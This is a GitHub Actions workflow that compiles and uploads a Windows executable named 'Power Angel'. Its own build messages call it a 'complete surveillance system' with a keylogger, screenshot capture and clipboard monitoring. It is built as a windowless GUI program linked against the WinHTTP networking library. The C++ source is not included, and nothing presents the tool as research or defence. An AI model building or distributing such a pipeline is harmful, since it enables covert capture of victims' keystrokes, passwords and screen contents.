name: Build Power Angel v8.0 Complete

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Build executable
      shell: cmd
      run: |
        echo Building Power Angel v8.0 - COMPLETE SYSTEM...
        echo ==============================================
        
        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
        
        echo [INFO] Compiling complete surveillance system...
        
        cl /O2 /MT /EHsc ^
          AngelSmartMichael.cpp ^
          /link ^
          gdi32.lib ^
          user32.lib ^
          kernel32.lib ^
          shell32.lib ^
          winhttp.lib ^
          gdiplus.lib ^
          ole32.lib ^
          oleaut32.lib ^
          comctl32.lib ^
          advapi32.lib ^
          /SUBSYSTEM:WINDOWS ^
          /ENTRY:wWinMainCRTStartup ^
          /OUT:PowerAngel_Complete.exe
        
        if %ERRORLEVEL% EQU 0 (
            echo ‚úÖ COMPLETE Build successful!
            echo üì¶ Features: Keylogger + Smart Screenshots + Clipboard Monitor
            dir PowerAngel_Complete.exe
        ) else (
            echo ‚ùå Build failed!
            exit 1
        )
    
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: PowerAngel-Complete-v8.0
        path: PowerAngel_Complete.exe
